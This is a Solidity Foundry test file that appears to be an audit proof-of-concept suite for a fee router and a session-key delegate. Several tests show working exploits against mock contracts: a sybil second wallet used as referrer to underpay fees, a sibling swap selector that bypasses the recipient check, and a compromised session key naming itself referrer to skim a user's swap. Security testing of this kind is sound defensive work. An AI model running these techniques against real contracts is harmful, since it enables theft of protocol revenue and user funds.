// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {FeeRouter, Route, IVeloRouter} from "../src/FeeRouter.sol";
import {SessionKeyDelegate} from "../src/SessionKeyDelegate.sol";

contract M20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) {
        require(balanceOf[msg.sender] >= a, "bal"); balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
    }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        require(balanceOf[f] >= a, "bal"); require(allowance[f][msg.sender] >= a, "allow");
        allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
}

contract MRouter {
    M20 public immutable tokenOut;
    constructor(M20 o) { tokenOut = o; }
    function swapExactTokensForTokens(uint256 amountIn, uint256 minOut, Route[] calldata routes, address to, uint256)
        external returns (uint256[] memory amounts)
    {
        M20(routes[0].from).transferFrom(msg.sender, address(this), amountIn);
        uint256 out = amountIn * 2;
        require(out >= minOut, "slip");
        tokenOut.mint(to, out);
        amounts = new uint256[](2); amounts[0] = amountIn; amounts[1] = out;
    }
}

contract ZZAgent4 is Test {
    M20 tIn; M20 tOut; MRouter router; FeeRouter fr;
    address attacker = address(0xA11CE);
    address attackerSecond = address(0xA11CE2); // SAME human, second wallet
    address operator = address(0x0FEE);

    function setUp() public {
        tIn = new M20(); tOut = new M20(); router = new MRouter(tOut);
        // Production wiring per scripts/deployfeerouter.ts defaults:
        // feeBps = 50 (0.5%), maxReferralShareBps = 3000 (30% of the fee)
        fr = new FeeRouter(address(router), operator, 50, 3000);
        tIn.mint(attacker, 1_000_000e18);
        vm.prank(attacker); tIn.approve(address(fr), type(uint256).max);
    }

    function _r() internal view returns (Route[] memory r) {
        r = new Route[](1);
        r[0] = Route({from: address(tIn), to: address(tOut), stable: false, factory: address(0xFAC)});
    }

    // ── F1: sybil referrer defeats BOTH the self-referral guard and the floor ──
    function test_F1_sybilReferrerUnderpaysFee() public {
        assertEq(fr.referredFeeBps(), 45, "constructor: 90% of 50");

        // Honest, unreferred swap of 100 tokens: operator should get 0.5%.
        vm.prank(attacker);
        fr.swapWithFee(100e18, 0, _r(), block.timestamp + 600, address(0), 0, 0);
        uint256 honest = tIn.balanceOf(operator);
        assertEq(honest, 0.5e18, "honest fee = 50bps");

        // Attack: name a SECOND wallet you own as "referrer". referrer != msg.sender
        // so the self-referral guard passes; floor drops to referredFeeBps (45).
        vm.prank(attacker);
        fr.swapWithFee(100e18, 0, _r(), block.timestamp + 600, attackerSecond, 3000, 45);

        uint256 opGain = tIn.balanceOf(operator) - honest;
        uint256 rebate = tIn.balanceOf(attackerSecond);
        emit log_named_decimal_uint("operator got (honest)", honest, 18);
        emit log_named_decimal_uint("operator got (sybil) ", opGain, 18);
        emit log_named_decimal_uint("rebated to attacker  ", rebate, 18);
        assertEq(rebate, 0.135e18, "30% of 45bps rebated to the attacker's own 2nd wallet");
        assertEq(opGain, 0.315e18, "operator keeps only 31.5bps of the 50bps headline");
        // 37% revenue loss, repeatable forever, no referral relationship required.
        assertLt(opGain, honest);
    }

    // ── F2: setConfig fee DECREASE bricks every referred swap ─────────────────
    function test_F2_feeDecreaseBricksReferredSwaps() public {
        FeeRouter f2 = new FeeRouter(address(router), operator, 100, 3000); // 1% launch
        assertEq(f2.referredFeeBps(), 90);
        tIn.mint(attacker, 1_000e18);
        vm.prank(attacker); tIn.approve(address(f2), type(uint256).max);

        // Operator halves the headline fee via scripts/feerouterconfig.ts.
        f2.setConfig(operator, 50, 3000);
        assertEq(f2.feeBps(), 50);
        // The clamp DESTROYS the discount: referredFeeBps == feeBps now.
        assertEq(f2.referredFeeBps(), 50, "discount silently clamped to the headline rate");

        // The bot recomputes referredBps = floor(50 * 0.9) = 45 (src/config/env.ts)
        // and passes it as feeBpsOverride. floorBps is now 50 -> hard revert.
        vm.prank(attacker);
        vm.expectRevert(FeeRouter.FeeTooHigh.selector);
        f2.swapWithFee(100e18, 0, _r(), block.timestamp + 600, attackerSecond, 3000, 45);

        // Unreferred swaps still work -> silent, partial, referral-only outage.
        vm.prank(attacker);
        f2.swapWithFee(100e18, 0, _r(), block.timestamp + 600, address(0), 0, 50);
    }

    // ── Verify the DuplicateTarget fix actually executes ──────────────────────
    function test_verify_duplicateTargetEnforced() public {
        SessionKeyDelegate d = new SessionKeyDelegate();
        address key = address(0xBEEF);
        address token = address(tIn);
        SessionKeyDelegate.TargetPolicy[] memory ps = new SessionKeyDelegate.TargetPolicy[](2);
        bytes4[] memory un = new bytes4[](1);
        un[0] = bytes4(keccak256("swapExactTokensForTokens(uint256,uint256,(address,address,bool,address)[],address,uint256)"));
        ps[0] = SessionKeyDelegate.TargetPolicy({target: token, selectors: un, tokenPerTxCap: 0, tokenDailyCap: 0});
        bytes4[] memory cap = new bytes4[](1);
        cap[0] = bytes4(keccak256("transfer(address,uint256)"));
        ps[1] = SessionKeyDelegate.TargetPolicy({target: token, selectors: cap, tokenPerTxCap: 1e18, tokenDailyCap: 1e18});
        vm.prank(address(d));
        vm.expectRevert(SessionKeyDelegate.DuplicateTarget.selector);
        d.registerSession(key, uint48(block.timestamp + 1 days), 1 ether, 1 ether, ps);
    }

    // ── Verify the swap-recipient decode actually executes ────────────────────
    function test_verify_swapRecipientDecodeEnforced() public {
        SessionKeyDelegate d = new SessionKeyDelegate();
        address key = address(0xBEEF);
        bytes4[] memory sels = new bytes4[](2);
        sels[0] = bytes4(keccak256("swapExactTokensForTokens(uint256,uint256,(address,address,bool,address)[],address,uint256)"));
        // A router selector NOT on the delegate's decode list but WITH a `to`.
        sels[1] = bytes4(keccak256("swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256,uint256,(address,address,bool,address)[],address,uint256)"));
        SessionKeyDelegate.TargetPolicy[] memory ps = new SessionKeyDelegate.TargetPolicy[](1);
        ps[0] = SessionKeyDelegate.TargetPolicy({target: address(router), selectors: sels, tokenPerTxCap: 0, tokenDailyCap: 0});
        vm.prank(address(d));
        d.registerSession(key, uint48(block.timestamp + 1 days), 1 ether, 1 ether, ps);

        Route[] memory rr = _r();
        // (a) decoded selector with to=attacker -> correctly REJECTED.
        bytes memory bad = abi.encodeWithSelector(sels[0], uint256(1e18), uint256(0), rr, attacker, block.timestamp + 600);
        vm.prank(key);
        vm.expectRevert(abi.encodeWithSelector(SessionKeyDelegate.SpenderNotAllowed.selector, attacker));
        d.execute(address(router), 0, bad);

        // (b) SAME `to`, un-decoded sibling selector -> passes the policy layer
        //     entirely (reverts only inside the mock router, which lacks the fn).
        bytes memory bypass = abi.encodeWithSelector(sels[1], uint256(1e18), uint256(0), rr, attacker, block.timestamp + 600);
        vm.prank(key);
        try d.execute(address(router), 0, bypass) {
            emit log("bypass selector reached the target");
        } catch (bytes memory e) {
            // Must NOT be SpenderNotAllowed -> proves no recipient check ran.
            assertTrue(bytes4(e) != SessionKeyDelegate.SpenderNotAllowed.selector, "recipient check ran");
            assertEq(bytes4(e), SessionKeyDelegate.CallFailed.selector, "reached the target, policy did not stop it");
            emit log("recipient check DID NOT run for the sibling selector");
        }
    }

    // swapWithFee IS granted by src/custody/delegation.ts and carries an
    // unauthenticated, value-receiving `referrer`. It is not on the decode list.
    function test_verify_grantedSwapWithFeeReferrerUnchecked() public {
        SessionKeyDelegate d = new SessionKeyDelegate();
        address key = address(0xBEEF);
        bytes4 selFee =
            bytes4(keccak256("swapWithFee(uint256,uint256,(address,address,bool,address)[],uint256,address,uint16,uint16)"));
        bytes4 selApprove = bytes4(keccak256("approve(address,uint256)"));

        SessionKeyDelegate.TargetPolicy[] memory ps = new SessionKeyDelegate.TargetPolicy[](2);
        bytes4[] memory a = new bytes4[](1); a[0] = selFee;
        ps[0] = SessionKeyDelegate.TargetPolicy({target: address(fr), selectors: a, tokenPerTxCap: 0, tokenDailyCap: 0});
        bytes4[] memory b = new bytes4[](1); b[0] = selApprove;
        ps[1] = SessionKeyDelegate.TargetPolicy({target: address(tIn), selectors: b, tokenPerTxCap: 1000e18, tokenDailyCap: 1000e18});
        vm.prank(address(d));
        d.registerSession(key, uint48(block.timestamp + 1 days), 1 ether, 1 ether, ps);

        tIn.mint(address(d), 1000e18);
        vm.prank(key);
        d.execute(address(tIn), 0, abi.encodeWithSelector(selApprove, address(fr), uint256(100e18)));

        // Compromised key names ITSELF as referrer on the user's own swap.
        vm.prank(key);
        d.execute(address(fr), 0, abi.encodeWithSelector(
            selFee, uint256(100e18), uint256(0), _r(), block.timestamp + 600, key, uint16(3000), uint16(45)
        ));
        emit log_named_decimal_uint("session key skimmed (referrer)", tIn.balanceOf(key), 18);
        assertGt(tIn.balanceOf(key), 0, "unchecked recipient in a GRANTED selector");
    }
}
